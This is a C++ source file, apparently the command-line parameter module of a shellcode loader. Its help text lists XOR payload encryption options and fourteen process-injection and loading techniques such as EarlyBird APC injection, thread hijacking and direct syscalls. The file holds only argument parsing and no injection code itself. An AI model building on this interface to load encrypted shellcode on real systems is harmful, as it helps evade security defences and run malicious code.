//
// Created by au9u5t on 24-9-29.
//

#include <cstring>
#include "Parameter.h"
namespace Parameter {
    bool isPrintHelp(int argc, char **argv) {
        if (argc == 2) {
            if (strcmp(argv[1], "-h") == 0 ||
            strcmp(argv[1], "--help") == 0 ||
            strcmp(argv[1], "-help") == 0 ||
            strcmp(argv[1], "help") == 0) {
                return true;
            }
        }
        return false;
    }

    void Parameter::printHelp() {
        std::cout << "Usage: tool [opt] " << std::endl;
        std::cout << "for example: tool 1 [filepath] [EncryptionMethod] [Key] [function_mode] [application_name]"
                  << std::endl;
        std::cout << "             filepath: path to the file" << std::endl;
        std::cout << "             EncryptionMethod: 6N_XOR,file_XOR" << std::endl;
        std::cout << "                               6N_XOR: 6-digit number XOR Key" << std::endl;
        std::cout << "                               file_XOR: XOR Key from file" << std::endl;
        std::cout << "             Key: 6 characters XOR Key or path to the key file" << std::endl;
        std::cout << "             function_mode: 1  means to use directlyLoad" << std::endl;
        std::cout << "                            2  means to use apcLoad" << std::endl;
        std::cout << "                            3  means to use ThreatPoolWait" << std::endl;
        std::cout << "                            4  means to use dynamicLoad" << std::endl;
        std::cout << "                            5  means to use dynamicLoadPlus" << std::endl;
        std::cout << "                            6  means to use EarlyBirdAPC_InjetcLoad" << std::endl;
        std::cout << "                            7  means  to use fiberLoad" << std::endl;
        std::cout << "                            8  means  to use ntCreateSectionLoad" << std::endl;
        std::cout << "                            9  means  to use ntTestAlertLoad" << std::endl;
        std::cout << "                            10 means to use OEPHiijack_Inj    ectLoad" << std::endl;
        std::cout << "                            11 means to use SEHExceptLoad" << std::endl;
        std::cout << "                            12 means to use syscallLoad" << std::endl;
        std::cout << "                            13 means to use threadHiijack_InjectLoad" << std::endl;
        std::cout << "                            14 means to use TLSLoad" << std::endl;
        std::cout << "              tool   [parameters_of_the_application]" << std::endl;
        std::cout << "                     Write the parameters of this program in parameter.txt," << std::endl;
        std::cout << "                     please keep the parameter format of the corresponding function."
                  << std::endl;

    }

    bool Parameter::checkParameters(int argc, char **argv) {
        parameter p{};
//    if (!p.isHasParameter(argc)) {
//        return false;
//    }
        if (argc == 1) {
            return true; // Possibly load the shellcode of pe file
        }
        switch (p.getOperation(argv[1])) {
            case 0: {
                return true; // for load application
            }
            case 1: {
                return p.checkOpt1(argc, argv);
            }
            default: {
                return false;
            }

        }

//    auto strMode = argv[1];
//    if (strcmp(strMode, "1") == 0) {
//
//
//        if (argc != 6) {
//            // printHelp();
//            std::cout << "argv length: " << argc << std::endl;
//            return false;
//        }
//        std::string filePath{argv[2]};
//        if (!File::isFileExists(filePath)) {
//            std::cout << "File does not exist!" << std::endl;
//            return false;
//        }
//
//        std::string encryptionMethod = argv[3];
//        if (encryptionMethod == "6N_XOR") {
//            std::string key = argv[4];
//            if (key.length() != 6) {
//                std::cout << "Key must be 6 characters long!" << std::endl;
//                return false;
//            }
//        } else if (encryptionMethod == "file_XOR") {
//            std::string key = argv[4];
//            if (!File::isFileExists(key)) {
//                std::cout << "Key file does not exist!" << std::endl;
//                return false;
//            }
//        } else {
//            // printHelp();
//            std::cout << "Invalid encryption method!" << std::endl;
//            return false;
//        }
//        std::string functionMode = argv[5];
//        if (functionMode != "1") {
//            // printHelp();
//            return false;
//        }
//    } else {
//        // printHelp();
//        return false;
//    }
//    return true;
    }

}